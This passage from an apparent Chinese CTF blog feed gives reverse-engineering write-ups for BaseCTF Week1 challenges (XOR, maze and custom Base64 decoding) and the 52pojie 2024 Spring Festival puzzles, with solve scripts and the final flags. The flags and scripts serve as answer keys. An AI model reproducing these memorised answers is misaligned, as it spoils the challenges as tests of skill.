class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">key, enc, length</span>):</span><br><span class="line">    decrypted = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        decrypted.append(enc[i] ^ key[length - i - <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = [</span><br><span class="line">    <span class="number">0x58</span>, <span class="number">0x6E</span>, <span class="number">0x70</span>, <span class="number">0x5B</span>, <span class="number">0x6B</span>, <span class="number">0x77</span>, <span class="number">0x5E</span>, <span class="number">0x68</span>,</span><br><span class="line">    <span class="number">0x7A</span>, <span class="number">0x51</span>, <span class="number">0x65</span>, <span class="number">0x79</span>, <span class="number">0x54</span>, <span class="number">0x62</span>, <span class="number">0x7C</span>, <span class="number">0x57</span>,</span><br><span class="line">    <span class="number">0x7F</span>, <span class="number">0x63</span>, <span class="number">0x4A</span>, <span class="number">0x7C</span>, <span class="number">0x66</span>, <span class="number">0x4D</span>, <span class="number">0x79</span>, <span class="number">0x65</span>,</span><br><span class="line">    <span class="number">0x40</span>, <span class="number">0x76</span>, <span class="number">0x68</span>, <span class="number">0x43</span></span><br><span class="line">]</span><br><span class="line">enc = [</span><br><span class="line">    <span class="number">1</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">37</span>, <span class="number">38</span>, <span class="number">45</span>, <span class="number">11</span>, <span class="number">29</span>, <span class="number">36</span>, <span class="number">122</span>,</span><br><span class="line">    <span class="number">49</span>, <span class="number">32</span>, <span class="number">30</span>, <span class="number">73</span>, <span class="number">61</span>, <span class="number">103</span>, <span class="number">77</span>, <span class="number">80</span>, <span class="number">8</span>, <span class="number">37</span>,</span><br><span class="line">    <span class="number">46</span>, <span class="number">110</span>, <span class="number">5</span>, <span class="number">52</span>, <span class="number">34</span>, <span class="number">64</span>, <span class="number">59</span>, <span class="number">37</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">length = <span class="number">28</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag: &quot;</span>, <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> decrypt(key, enc, length)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>BaseCTF{X0R_I5_345Y_F0r_y0U}</p><h4 id="Week1-ez-maze"><a href="#Week1-ez-maze" class="headerlink" title="[Week1] ez_maze"></a>[Week1] ez_maze</h4><p>IDA报错</p><p><code>String table size 1298093129 is incorrect, maximum possible value is 29726. Do you want to continue with the new value?</code> </p><p><code>Corrupt COFF symbol table: too many aux records for COFF symbol #1168.</code></p><p>使用Binary Ninja可以正常解析程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">sub_401840()</span><br><span class="line"><span class="built_in">puts</span>(_Buffer: <span class="string">&quot;Can you walk the maze???&quot;</span>)</span><br><span class="line"><span class="built_in">puts</span>(_Buffer: <span class="string">&quot;Take the shortest path to the fi…&quot;</span>)</span><br><span class="line"><span class="built_in">puts</span>(_Buffer: <span class="string">&quot;Show your time!!!&quot;</span>)</span><br><span class="line"><span class="type">void</span> s</span><br><span class="line">__builtin_memset(s: &amp;s, c: <span class="number">0</span>, n: <span class="number">0x20</span>)</span><br><span class="line"><span class="type">int16_t</span>* rdi</span><br><span class="line">*rdi = <span class="number">0</span></span><br><span class="line">rdi[<span class="number">1</span>].b = <span class="number">0</span></span><br><span class="line"><span class="built_in">scanf</span>(_Format: <span class="string">&quot;%34s&quot;</span>, &amp;s)</span><br><span class="line"><span class="type">int32_t</span> var_1c = <span class="number">0</span></span><br><span class="line"><span class="type">int32_t</span> var_20 = <span class="number">0</span></span><br><span class="line"><span class="type">int64_t</span> rax_8</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    <span class="keyword">if</span> (*(&amp;s + sx.q(var_20)) == <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">puts</span>(_Buffer: <span class="string">&quot;You didn&#x27;t reach the end.&quot;</span>)</span><br><span class="line">        rax_8 = <span class="number">0</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="type">uint32_t</span> rax_7 = zx.d(*(&amp;s + sx.q(var_20)))</span><br><span class="line">    <span class="keyword">if</span> (rax_7 == <span class="number">0x64</span>)</span><br><span class="line">        <span class="keyword">if</span> (var_1c % <span class="number">0xf</span> == <span class="number">0xe</span>)</span><br><span class="line">            <span class="built_in">puts</span>(_Buffer: <span class="string">&quot;Invalid move: out of bounds!&quot;</span>)</span><br><span class="line">            rax_8 = <span class="number">0xffffffff</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        var_1c = var_1c + <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">if</span> (rax_7 == <span class="number">0x77</span>)</span><br><span class="line">            <span class="keyword">if</span> (var_1c &lt;= <span class="number">0xe</span>)</span><br><span class="line">                <span class="built_in">puts</span>(_Buffer: <span class="string">&quot;Invalid move: out of bounds!&quot;</span>)</span><br><span class="line">                rax_8 = <span class="number">0xffffffff</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            var_1c = var_1c - <span class="number">0xf</span></span><br><span class="line">        <span class="keyword">if</span> (rax_7 == <span class="number">0x73</span>)</span><br><span class="line">            <span class="keyword">if</span> (var_1c &gt; <span class="number">0xd1</span>)</span><br><span class="line">                <span class="built_in">puts</span>(_Buffer: <span class="string">&quot;Invalid move: out of bounds!&quot;</span>)</span><br><span class="line">                rax_8 = <span class="number">0xffffffff</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            var_1c = var_1c + <span class="number">0xf</span></span><br><span class="line">        <span class="keyword">if</span> ((rax_7 &lt;= <span class="number">0x64</span> &amp;&amp; rax_7 != <span class="number">0x61</span>) || (rax_7 &gt; <span class="number">0x64</span> &amp;&amp; rax_7 != <span class="number">0x73</span> &amp;&amp; rax_7 != <span class="number">0x77</span>))</span><br><span class="line">            <span class="built_in">puts</span>(_Buffer: <span class="string">&quot;Invalid input!&quot;</span>)</span><br><span class="line">            rax_8 = <span class="number">0xffffffff</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> (rax_7 == <span class="number">0x61</span>)</span><br><span class="line">            <span class="keyword">if</span> (var_1c % <span class="number">0xf</span> == <span class="number">0</span>)</span><br><span class="line">                <span class="built_in">puts</span>(_Buffer: <span class="string">&quot;Invalid move: out of bounds!&quot;</span>)</span><br><span class="line">                rax_8 = <span class="number">0xffffffff</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            var_1c = var_1c - <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> (*(sx.q(var_1c) + <span class="string">&quot;x$$$$$$$$$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;$$$$$$$$$&amp;$…&quot;</span>) == <span class="number">0x24</span>)</span><br><span class="line">        <span class="built_in">puts</span>(_Buffer: <span class="string">&quot;Invalid move: hit a wall!&quot;</span>)</span><br><span class="line">        rax_8 = <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> (*(sx.q(var_1c) + <span class="string">&quot;x$$$$$$$$$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;$$$$$$$$$&amp;$…&quot;</span>) == <span class="number">0x79</span>)</span><br><span class="line">        <span class="built_in">puts</span>(_Buffer: <span class="string">&quot;You win!&quot;</span>)</span><br><span class="line">        <span class="built_in">puts</span>(_Buffer: <span class="string">&quot;plz BaseCTF&#123;lower.MD5&#123;your path&#125;…&quot;</span>)</span><br><span class="line">        rax_8 = <span class="number">0</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    var_20 = var_20 + <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> rax_8</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据向右移动时 <code>if (var_1c % 0xf == 0xe)</code> 检查当前位置是否为行的最后一列可推知题目迷宫是一个 15 行 x 15 列的方形迷宫</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">x$$$$$$$$$$$$$$</span><br><span class="line">&amp;&amp;&amp;&amp;&amp;&amp;$$$$$$$$$</span><br><span class="line">&amp;$&amp;$$&amp;$$&amp;&amp;&amp;&amp;&amp;$$</span><br><span class="line">&amp;$&amp;$$$&amp;&amp;$$$$&amp;$$</span><br><span class="line">&amp;$$$&amp;&amp;&amp;$$$$$&amp;$$</span><br><span class="line">&amp;$$$&amp;$&amp;&amp;$&amp;$$$$$</span><br><span class="line">&amp;$$$&amp;$&amp;$$&amp;&amp;&amp;$$$</span><br><span class="line">&amp;&amp;&amp;&amp;&amp;$&amp;&amp;&amp;&amp;$&amp;$$$</span><br><span class="line">$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;$$$</span><br><span class="line">$$$$$$&amp;$$$$$$$$</span><br><span class="line">$$$&amp;&amp;&amp;&amp;$$&amp;&amp;&amp;$$$</span><br><span class="line">$$$&amp;&amp;&amp;&amp;&amp;&amp;&amp;$$$$$</span><br><span class="line">$$$$$$$$$&amp;$$&amp;$$</span><br><span class="line">$$$$$$$$$&amp;$&amp;$$$</span><br><span class="line">$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;y</span><br></pre></td></tr></table></figure><p>故路径为<code>sssssssddddwwwddsssssssdddsssddddd</code><br>BaseCTF{131b7d6e60e8a34cb01801ae8de07efe}</p><h4 id="Week1-BasePlus"><a href="#Week1-BasePlus" class="headerlink" title="[Week1] BasePlus"></a>[Week1] BasePlus</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">unpack_string</span>(<span class="params">encrypted</span>):</span><br><span class="line">    lookup_table = <span class="string">&#x27;/128GhIoPQROSTeUbADfgHijKLM+n0pFWXY456xyzB7=39VaqrstJklmNuZvwcdEC&#x27;</span></span><br><span class="line">    unpacked = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    xor_transform = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">ord</span>(char) ^ <span class="number">14</span>) <span class="keyword">for</span> char <span class="keyword">in</span> encrypted)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> position <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(xor_transform), <span class="number">4</span>):</span><br><span class="line">        index1 = lookup_table.index(xor_transform[position])</span><br><span class="line">        index2 = lookup_table.index(xor_transform[position + <span class="number">1</span>])</span><br><span class="line">        index3 = lookup_table.index(xor_transform[position + <span class="number">2</span>])</span><br><span class="line">        index4 = lookup_table.index(xor_transform[position + <span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">        first_byte = (index1 &lt;&lt; <span class="number">2</span>) | (index2 &gt;&gt; <span class="number">4</span>)</span><br><span class="line">        second_byte = ((index2 &amp; <span class="number">15</span>) &lt;&lt; <span class="number">4</span>) | (index3 &gt;&gt; <span class="number">2</span>)</span><br><span class="line">        third_byte = ((index3 &amp; <span class="number">3</span>) &lt;&lt; <span class="number">6</span>) | index4</span><br><span class="line"></span><br><span class="line">        unpacked += <span class="built_in">chr</span>(first_byte) + <span class="built_in">chr</span>(second_byte) + <span class="built_in">chr</span>(third_byte)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> unpacked.split(<span class="string">&#x27;\0&#x27;</span>, <span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">encrypted_input = <span class="string">&quot;lvfzBiZiOw7&lt;lhF8dDOfEbmI]i@bdcZfEc^z&gt;aD!&quot;</span></span><br><span class="line">decoded_output = unpack_string(encrypted_input)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, decoded_output)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>BaseCTF{BA5e_DEcoD1N6_sEcr3t}</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串gdb调试地址信息格式化字符串gdb调试地址信息</title>
      <link href="/2024/07/30/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
      <url>/2024/07/30/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
      
        <content type="html"><![CDATA[<p><strong>gdb 查看内存地址</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x/10i $pc   # 查看程序计数器（PC）当前指向的指令</span><br><span class="line">x/10i &lt;address&gt;  # 查看特定地址的指令</span><br><span class="line">info symbol &lt;address&gt;  # 查看地址对应的符号信息</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/07/29/hello-world/"/>
      <url>/2024/07/29/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>吾爱破解 2024 春节题目</title>
      <link href="/2024/02/25/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A32024%E6%98%A5%E8%8A%82%E9%A2%98%E7%9B%AE/"/>
      <url>/2024/02/25/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A32024%E6%98%A5%E8%8A%82%E9%A2%98%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<h3 id="Windows-初级题"><a href="#Windows-初级题" class="headerlink" title="Windows 初级题"></a>Windows 初级题</h3><p>比较输入字符串长度，如果等于36，就循环进行判断，否则退出程序： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v34 == <span class="number">36</span> )</span><br></pre></td></tr></table></figure><p>比较输入字符串与v9中的字符串：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *v10 != *v9 )</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>在此处打断点，运行程序，输入长度为36的字符串之后，查看v9中存储的字符串即为flag</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fl@g&#123;H@ppy_N3w_e@r!2o24!Fighting!!!&#125;</span><br></pre></td></tr></table></figure><h3 id="Android-初级题"><a href="#Android-初级题" class="headerlink" title="Android 初级题"></a>Android 初级题</h3><p>手动通关或者解包找视频获得flag</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;happy_new_year_2024&#125;</span><br></pre></td></tr></table></figure><h3 id="Android-初级题-1"><a href="#Android-初级题-1" class="headerlink" title="Android 初级题"></a>Android 初级题</h3><p>WishActivity中FlagActivity是关键：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wishActivity.startActivity(<span class="keyword">new</span> <span class="title class_">Intent</span>(wishActivity, FlagActivity.class));</span><br></pre></td></tr></table></figure><p>FlagActivity代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">ackage com.kbtx.redpack_simple;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> a.b.c.h;</span><br><span class="line"><span class="keyword">import</span> android.content.pm.PackageManager;</span><br><span class="line"><span class="keyword">import</span> android.content.pm.Signature;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"><span class="keyword">import</span> b.a.a.a.a;</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlagActivity</span> <span class="keyword">extends</span> <span class="title class_">h</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] o = &#123;<span class="number">86</span>, -<span class="number">18</span>, <span class="number">98</span>, <span class="number">103</span>, <span class="number">75</span>, -<span class="number">73</span>, <span class="number">51</span>, -<span class="number">104</span>, <span class="number">104</span>, <span class="number">94</span>, <span class="number">73</span>, <span class="number">81</span>, <span class="number">125</span>, <span class="number">118</span>, <span class="number">112</span>, <span class="number">100</span>, -<span class="number">29</span>, <span class="number">63</span>, -<span class="number">33</span>, -<span class="number">110</span>, <span class="number">108</span>, <span class="number">115</span>, <span class="number">51</span>, <span class="number">59</span>, <span class="number">55</span>, <span class="number">52</span>, <span class="number">77</span></span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span> <span class="comment">// a.b.c.h, a.i.a.d, androidx.activity.ComponentActivity, a.f.b.g, android.app.Activity</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle)</span> &#123;</span><br><span class="line">       <span class="type">byte</span>[] bArr;</span><br><span class="line">       Signature[] signatureArr;</span><br><span class="line">       <span class="built_in">super</span>.onCreate(bundle);</span><br><span class="line">       setContentView(R.layout.activity_flag);</span><br><span class="line">       <span class="type">byte</span>[] bArr2 = o;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           signatureArr = getPackageManager().getPackageInfo(getPackageName(), <span class="number">64</span>).signatures;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (PackageManager.NameNotFoundException unused) &#123;</span><br><span class="line">           bArr = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">      &#125;</span><br><span class="line">       <span class="keyword">if</span> (signatureArr != <span class="literal">null</span> &amp;&amp; signatureArr.length &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">           <span class="type">byte</span>[] byteArray = signatureArr[<span class="number">0</span>].toByteArray();</span><br><span class="line">           <span class="type">ByteBuffer</span> <span class="variable">allocate</span> <span class="operator">=</span> ByteBuffer.allocate(bArr2.length);</span><br><span class="line">           <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bArr2.length; i++) &#123;</span><br><span class="line">               allocate.put((<span class="type">byte</span>) (bArr2[i] ^ byteArray[i % byteArray.length]));</span><br><span class="line">          &#125;</span><br><span class="line">           bArr = allocate.array();</span><br><span class="line">           <span class="type">StringBuilder</span> <span class="variable">d</span> <span class="operator">=</span> a.d(<span class="string">&quot;for honest players only: \n&quot;</span>);</span><br><span class="line">           d.append(<span class="keyword">new</span> <span class="title class_">String</span>(bArr));</span><br><span class="line">          ((TextView) findViewById(R.id.tvFlagHint)).setText(d.toString());</span><br><span class="line">      &#125;</span><br><span class="line">       bArr = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">       <span class="type">StringBuilder</span> <span class="variable">d2</span> <span class="operator">=</span> a.d(<span class="string">&quot;for honest players only: \n&quot;</span>);</span><br><span class="line">       d2.append(<span class="keyword">new</span> <span class="title class_">String</span>(bArr));</span><br><span class="line">      ((TextView) findViewById(R.id.tvFlagHint)).setText(d2.toString());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据FlagActivity写出脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> androguard.misc <span class="keyword">import</span> AnalyzeAPK</span><br><span class="line"></span><br><span class="line">o = [<span class="number">86</span>, -<span class="number">18</span>, <span class="number">98</span>, <span class="number">103</span>, <span class="number">75</span>, -<span class="number">73</span>, <span class="number">51</span>, -<span class="number">104</span>, <span class="number">104</span>, <span class="number">94</span>, <span class="number">73</span>, <span class="number">81</span>, <span class="number">125</span>, <span class="number">118</span>, <span class="number">112</span>, <span class="number">100</span>, -<span class="number">29</span>, <span class="number">63</span>, -<span class="number">33</span>, -<span class="number">110</span>, <span class="number">108</span>, <span class="number">115</span>, <span class="number">51</span>, <span class="number">59</span>, <span class="number">55</span>, <span class="number">52</span>, <span class="number">77</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Java字节(-128~127) 转 Python字节(0~255)</span></span><br><span class="line">o = [i &amp; <span class="number">0xFF</span> <span class="keyword">for</span> i <span class="keyword">in</span> o]</span><br><span class="line"></span><br><span class="line">a, d, dx = AnalyzeAPK(<span class="string">&quot;52pj.apk&quot;</span>)</span><br><span class="line"></span><br><span class="line">signatures = a.get_certificates()</span><br><span class="line"></span><br><span class="line">signature_bytes = signatures[<span class="number">0</span>].dump()</span><br><span class="line"></span><br><span class="line">signature_byte_array = [i <span class="keyword">for</span> i <span class="keyword">in</span> signature_bytes]</span><br><span class="line"></span><br><span class="line">result = [o[i] ^ signature_byte_array[i % <span class="built_in">len</span>(signature_byte_array)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(o))]</span><br><span class="line"></span><br><span class="line">result_bytes = <span class="built_in">bytes</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">   result_string = result_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;Error&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;for honest players only: \n&quot;</span> + result_string)</span><br><span class="line">flag&#123;52pj_HappyNewYear2024&#125;</span><br></pre></td></tr></table></figure><h3 id="Web-初级题-中级题-高级题"><a href="#Web-初级题-中级题-高级题" class="headerlink" title="Web 初级题 中级题 高级题"></a>Web 初级题 中级题 高级题</h3><h5 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h5><p>00:00:02:10出现波纹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag1&#123;52pj2024&#125;</span><br></pre></td></tr></table></figure><h5 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h5><p>访问：<a href="http://2024challenge.52pojie.cn/">http://2024challenge.52pojie.cn</a></p><p>得到X-Flag2: flag2{xHOpRP}</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag2&#123;xHOpRP&#125;</span><br></pre></td></tr></table></figure><h5 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h5><p>视频开头摩尔纹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag3&#123;GRsgk2&#125;</span><br></pre></td></tr></table></figure><h5 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h5><p>F12 <a href="https://2024challenge.52pojie.cn/flag4_flag10.png">https://2024challenge.52pojie.cn/flag4_flag10.png</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag4&#123;YvJZNS&#125;</span><br></pre></td></tr></table></figure><h5 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h5><p>平台注释</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">&lt;!-- flag5 flag9 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span 